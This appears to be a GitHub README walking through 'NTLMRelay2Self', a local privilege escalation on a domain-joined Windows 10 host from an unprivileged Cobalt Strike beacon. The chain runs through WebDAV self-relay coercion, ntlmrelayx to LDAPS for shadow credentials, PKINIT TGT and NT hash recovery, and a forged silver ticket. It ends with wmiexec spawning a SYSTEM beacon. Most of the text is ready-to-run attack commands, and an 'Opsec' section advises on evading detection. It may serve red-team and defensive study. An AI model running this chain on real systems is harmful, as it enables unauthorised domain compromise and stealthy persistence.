# NTLMRelay2Self

## NTLMRelay2Self over HTTP (Webdav)
 
<b>An other No-Fix LPE</b>

Just a walkthrough of how to escalate privileges locally by forcing the system you landed initial access on to reflectively authenticate over HTTP to itself and forward the received connection to an HTTP listener (ntlmrelayx) configured to relay to DC servers over LDAP/LDAPs for either setting shadow credentials or configuring RBCD.

This would result in a valid kerberos TGT ticket that can be used to obtain a TGS for a service (HOST/CIFS) using `S4U2Self` by impersonating a user with local administrator access to the host (domain admin ..etc), or alternatively, it's also possible to retrieve the machine account's NTLM hash with getnthash.py and then create a silver ticket.

Lastly, use the TGS or silver ticket to spawn a system (session 0) process, this can be achieved by simply using `WMIExec` or alternatively using `SCMUACBypass` script to rely on kerberos for auth to interact with the SCM and create a service in the context of SYSTEM.

The steps below lists all the actions taken to escalate privileges locally on an up to date Windows 10 (1909) system, the cobalt strike beacon (or any other c2 agent) is running in the context of an unprivileged user `LAB\User1`. 


<b>Domain:</b> lab.local <br>
<b>DC IP:</b> 10.2.10.1 <br>
<b>Win10 IP:</b> 10.10.177.112 <br>
<b>Linux machine CS client running on:</b> 172.16.1.5 <br>

### <u>Steps:</u>


1. Start the WebClient service from an unprivileged context: <br>
    `inline-execute StartWebClientSvc.x64.o`
    `sc_query webclient`

2. On your cobalt strike beacon, setup a socks proxy and reverse port forward: <br>
`socks 5009`<br>
`rportfwd_local 80 172.16.1.5 80`

3. Check if `msDS-KeyCredentialLink` attribute is Not already set on the current `WIN10` machine account. <br>
`ldapsearch "(&(objectClass=computer)(sAMAccountName=WIN10*))" sAMAccountName,msDS-KeyCredentialLink`

4. Setup the Listener on Linux system CS client is running on: <br>
`proxychains python3 ntlmrelayx.py -domain lab.local -t ldaps://10.2.10.1 --shadow-credentials --shadow-target WIN10\$`

5. Coerce the `WIN10` system to authenticate to itself to port 80 (HTTP), this requires the <u>WebClient</u> service and the <u>Printer Spooler</u> service to be running on `WIN10`::<br>
`proxychains python3 printerbug.py "lab.local/User1:Passw0rd01@10.10.177.112" wind10@80/print` <br> Alternatively, you can use PetitPotam: <br>
`python3 PetitPotam.py -u User1 -p Passw0rd01 -d lab.local WIN10@80/print 10.10.177.112`

7. If the previous two (2) steps were executed with no error, you should get a message stating shadow credentials were successfully set on the WIN10$ machine account, you can quiclky check for that using: <br>
`ldapsearch "(&(objectClass=computer)(sAMAccountName=WIN10*))" sAMAccountName,msDS-KeyCredentialLink`

<br><b>The remaining steps are standard PKINIT actions to get a TGT for WIN10$, then recover the NT Hash and lastly create a silver ticket for the `HOST\WIN10` SPN: </b><br><br>

8. Request a TGT for WIN10$:<br>
 `proxychains python3 gettgtpkinit.py -cert-pfx WIN10.pfx -pfx-pass 8kX4grjUrY8gvzjrphl5 lab.local/WIN10$ WIN10.ccache`

9. `export KRB5CCNAME=/PATH_TO/WIN10.ccache`

10. Get the NT Hash:<br>
 `proxychains python3 getnthash.py -key 397eef25429f6b7249a11dfaa874df5c92bf44974b1bb962591937d656f0e827 -dc-ip 10.2.10.1 lab.local/WIN10$`

11. Create a silver ticket for the HOST SPN:<br>
 `impacket-ticketer -domain-sid S-1-5-21-81107902-1099128984-1836738286 -domain lab.local -spn HOST/WIN10.LAB.LOCAL -nthash db6484c89c273e269a23b1bdc53f7cdf -user-id 1155 Administrator`

12. Export the silver ticket for kerberos auth:<br>
 `export KRB5CCNAME=/PATH_TO/Administrator.ccache`

13. Get a SYSTEM beacon using `Wmiexec`:<br>
`proxychains4 python3 wmiexec.py -nooutput -silentcommand -dc-ip 10.2.10.1 -k -no-pass lab.local/Administrator@WIN10.LAB.LOCAL 'C:\Users\User1\Desktop\Files\mcbuilder.exe'` <br>
Or alternatively use `SCMUACBypass` script from James (@tiraniddo)


### <u>Cleanup:</u>

1. Export the TGT created in step 8:<br>
 `export KRB5CCNAME=/PATH_TO/WIN10.ccache`

2. Get the public key set on `ms-dsKeyCredentialLink` GUID:<br>
 `proxychains python3 pywhisker.py -u "WIN10$" -d "lab.local" --dc-ip 10.2.10.1 -k --no-pass --target 'WIN10$' --action "list" -vv`

3. Remove the public key set:<br>
 `proxychains python3 pywhisker.py -u "WIN10$" -d "lab.local" --dc-ip 10.2.10.1 -k --no-pass --target 'WIN10$' --action "remove" -D 97dc9d92-6d23-6031-7e1d-b5a13e305c8b`

4. Check if the public key is removed:<br>
 `ldapsearch "(&(objectClass=computer)(sAMAccountName=WIN10*))" sAMAccountName,msDS-KeyCredentialLink`


### <u>Notes:</u>

* Shadow Credentials requires LDAP signing and channel binding to be disabled, you can use `LDAPRelayScan` to confirm that.
* Machine accounts are allowed to change their own LDAP attributes (Not applicable for user accounts), however keep in mind that this will only work in case if the `ms-DSKeyCredentialLink` attribute does not exist for the machine account we want to LPE on.
* LDAP Signing and Channel Binding must be disabled on the DC (typical configuration for many DC deployments)
* When Testing in a HomeLab, make sure you've:
    * Windows Server 2016 Functional Level for AD
    * A digital certificate for Server Authentication on DC.
    * Disable Windows Firewall on the Win10 system, this would not be a road block when dealing with real world organizations.

### <u>Opsec !!:</u>

- Using Ticketer for forging a silver ticket from the NT hash can be detected (ATA) by monitoring for RC4 encrypted Kerberos ticket, most modern MS environments rely on AES Kerberos encryption instead. an alternative would be to use S4U2Self to obtain a TGS ticket check `gets4uticket` from Dirk-jan.

- SCMUACBypass creates a service, can be customized to update an existing service and point it to your beacon payload instead of `cmd.exe`, `Wmiexec` doesn't create any services, that does not mean that Wmiexec with `-nooutput` and `-silentcommand` have no detections. just an opsec-safe alternative with a minimal footprint, i could be wrong though, who knows. 

- Shadow Credentials changes the `ms-DsKeyCredentialLink` only, on the other hand RBCD requires the `MachineQuota` to be set to 10 for default domain users (not always the case), plus a computer object will need to be created or have control over an existing AD joined system with an SPN set (required for delegation), then reflect it in the `AllowedToActOnBehalfOfOtherIdentity` LDAP attribute.



### <u>Refs: </u>
* `LdapRelayScan` https://github.com/zyn3rgy/LdapRelayScan
* `SCMBypassUAC` https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
* `gets4uticket` https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py
* `impacket` https://github.com/SecureAuthCorp/impacket

### <u>Credits: </u>
Based on the research and tools/PoCs created by:
* @tifkin_
* @tiraniddo
* @_dirkjan
* @harmj0y
* @ShutdownRepo
* @topotam

